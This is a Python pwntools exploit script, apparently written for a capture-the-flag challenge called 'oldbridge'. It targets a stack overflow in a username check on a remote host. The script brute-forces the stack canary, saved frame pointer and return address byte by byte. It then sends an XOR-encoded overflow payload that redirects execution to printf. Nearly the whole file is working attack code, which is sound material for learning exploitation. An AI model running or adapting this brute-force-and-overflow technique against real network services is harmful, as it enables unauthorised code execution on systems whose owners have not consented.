#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
from session import * # custom module for saving data

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./exe/oldbridge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '88.198.233.174'
port = int(args.PORT or 33429)

def local(argv=[], *a, **kw):
    '''Connect to the process on the local host'''
    io = connect("localhost", 1123)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break main
set follow-fork-mode child
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

"""
Pseudo-code of check_username
__int64 __fastcall check_username(int a1)
{
  unsigned int v2; // [rsp+14h] [rbp-41Ch]
  int i; // [rsp+18h] [rbp-418h]
  int v4; // [rsp+1Ch] [rbp-414h]
  char buf[1032]; // [rsp+20h] [rbp-410h]
  unsigned __int64 v6; // [rsp+428h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v2 = 0;
  write(a1, "Username: ", 0xAuLL);
  v4 = read(a1, buf, 1056uLL);
  for ( i = 0; i < v4; ++i )
    buf[i] ^= 13u;
  if ( !memcmp(buf, "il{dih", 6uLL) )
    v2 = 1;
  return v2;
}
"""

# messages from app
SUCCESS_MSG = "Username found!"
PROMPT_MSG = "Username: "

# create session
context.terminal = ['xfce4-terminal', '-e']
config = {}
create_session("oldbridge", args.LOCAL)

# username found in binary
username = "il{dih"
# buffer size (buffer size = cookie offset)
buffer_size = 1032
# rbp offset
rbp_offset = 1040
# rip offset
rip_offset = 1048
# stack: |buffer|cookie|rbp|rip|

# the input is xor-ed
def xor13(s):
    return ''.join(str(chr(ord(x) ^ 13)) for x in s)

# create a connection to the server
# send some data (xor-ed by 13)
# check if it crashed ;)
def server_check(prefix_size, data, prefix = "", keep = False):
    io = start()
    to_send = xor13(username + \
              cyclic(prefix_size - len(username) - len(prefix)) + \
              prefix + data)

    io.sendafter(PROMPT_MSG, to_send)
    recv_data = io.clean()
    if not keep: io.close()
    else: io.interactive()
    return SUCCESS_MSG in recv_data

# bruteforce a 8 byte long value on the stack
# offset -> offset from the buffer
def bruteforce_value(offset, prefix = ""):
    value = ""
    for y in range(8):
        log.info("Bruteforcing byte {}".format(y + 1))
        for x in range(0x0, 0x100):
            temp_value = value + chr(x)
            log.info("Trying {}".format(hex(x)))

            alive = server_check(offset, temp_value, prefix = prefix)
            if alive:
                log.success("Found byte {}".format(hex(x)))
                value = temp_value
                break

    if len(value) == 8:
        log.success("Found: " + value)
    else:
        log.error("Bruteforce failed")
    return value

# load session
if args.LOAD:
    config = load_vars()
    log.info("Load session {}".format(config))


# we need the stack cookie to do a proper exploit
if 'cookie' not in config:
    config['cookie'] = bruteforce_value(buffer_size)
save_vars(config)

# we need the rbp and rip to be leaked too
if 'rbp' not in config:
    config['rbp'] = bruteforce_value(rbp_offset,
                    prefix = config['cookie'])
save_vars(config)
if 'rip' not in config:
    config['rip'] = bruteforce_value(rip_offset,
                    prefix = config['cookie'] + config['rbp'])
save_vars(config)

log.info("Cookie: " + hex(u64(config['cookie'])))
log.info("RBP: " + hex(u64(config['rbp'])))
log.info("RIP: " + hex(u64(config['rip'])))

# check if leaked values are still good (debug only)
"""alive = server_check(buffer_size,
                     config['cookie'] + config['rbp'] + config['rip'])
if not alive:
    log.error("Run bruteforce again")
else:
    log.success("All good")
"""

def craft(data):
    payload = username + cyclic(buffer_size - len(username)) + data
    return xor13(payload)

printf_plt = 0x940
rip_printf = u64(config['rip']) // 0x10000 * 0x10000 + printf_plt
log.info("printf@plt: " + hex(rip_printf))

payload = craft(config['cookie'] + config['rbp'] + p64(rip_printf))

io = start()
log.info("Payload: " + payload)
io.sendafter(PROMPT_MSG, payload)
print ("DATA:" + io.clean())
# save the session
save_vars(config)
